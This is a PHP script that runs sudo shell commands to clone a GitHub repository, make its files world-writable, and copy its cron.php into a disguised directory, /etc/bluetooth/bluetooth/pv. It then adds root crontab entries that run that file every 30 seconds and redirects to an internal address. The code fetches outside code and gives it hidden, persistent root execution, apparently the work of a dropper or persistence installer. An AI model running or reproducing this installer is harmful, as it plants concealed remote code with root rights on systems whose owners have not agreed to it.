<?php

// Function to execute shell commands and check results
function executeCommand($command, $successMessage, $errorMessage) {
    exec($command . ' 2>&1', $output, $returnCode);
    if ($returnCode === 0) {
        echo $successMessage . "\n";
        return true;
    } else {
        echo $errorMessage . ": " . implode("\n", $output) . "\n";
        return false;
    }
}

// Step 1: Clone the repository
if (is_dir('pv')) {
    $removeCommand = "sudo rm -rf pv";
    if (!executeCommand($removeCommand, "Existing pv directory removed successfully", "Failed to remove existing pv directory")) {
        exit(1);
    }
}
$cloneCommand = "sudo git clone https://github.com/s1L3n7-sH/pv";
if (!executeCommand($cloneCommand, "Repository cloned successfully", "Failed to clone repository")) {
    exit(1);
}

// Step 2: Change directory and set permissions
if (is_dir('pv')) {
    $chmodCommand = "sudo bash -c 'cd pv && chmod 777 *'";
    if (!executeCommand($chmodCommand, "Permissions set successfully", "Failed to set permissions")) {
        exit(1);
    }
} else {
    echo "Error: Repository directory not found\n";
    exit(1);
}

// Step 3: Add cron jobs
$sourceCronFile = "pv/cron.php";
$targetCronFile = "/etc/bluetooth/bluetooth/pv/cron.php";
if (file_exists($sourceCronFile)) {
    $targetDir = "/etc/bluetooth/bluetooth/pv";
    // Ensure the target directory exists
    if (!is_dir($targetDir)) {
        $mkdirCommand = "sudo mkdir -p {$targetDir}";
        if (!executeCommand($mkdirCommand, "Target directory created", "Failed to create target directory")) {
            exit(1);
        }
    }
    
    // Copy the cron.php file to the target location
    $copyCommand = "sudo cp {$sourceCronFile} {$targetCronFile}";
    if (!executeCommand($copyCommand, "Cron file copied successfully to {$targetCronFile}", "Failed to copy cron.php")) {
        exit(1);
    }
    
    // Verify the copied file exists
    if (!file_exists($targetCronFile)) {
        echo "Error: {$targetCronFile} not found after copy\n";
        exit(1);
    } else {
        echo "Verified: {$targetCronFile} exists\n";
    }
    
    // Add cron jobs using the exact command provided
    $cronCommand = 'sudo bash -c \'(crontab -l 2>/dev/null; echo "* * * * * php /etc/bluetooth/bluetooth/pv/cron.php"; echo "* * * * * sleep 30 && php /etc/bluetooth/bluetooth/pv/cron.php") | crontab -\'';
    if (executeCommand($cronCommand, "Cron jobs added successfully", "Failed to add cron jobs")) {
        // Verify cron jobs were added
        exec("crontab -l", $cronOutput, $cronReturnCode);
        if ($cronReturnCode === 0 && !empty($cronOutput)) {
            $cronContent = implode("\n", $cronOutput);
            if (strpos($cronContent, "php /etc/bluetooth/bluetooth/pv/cron.php") !== false) {
                echo "Verified: Cron jobs for {$targetCronFile} found in crontab\n";
            } else {
                echo "Error: Cron jobs for {$targetCronFile} not found in crontab\n";
                exit(1);
            }
        } else {
            echo "Error: Failed to verify cron jobs\n";
            exit(1);
        }
    } else {
        exit(1);
    }
} else {
    echo "Error: {$sourceCronFile} not found in repository\n";
    exit(1);
}

// Step 4: Redirect to the specified URL
header("Location: http://10.0.0.1/pv/cron.php");
exit();

?>
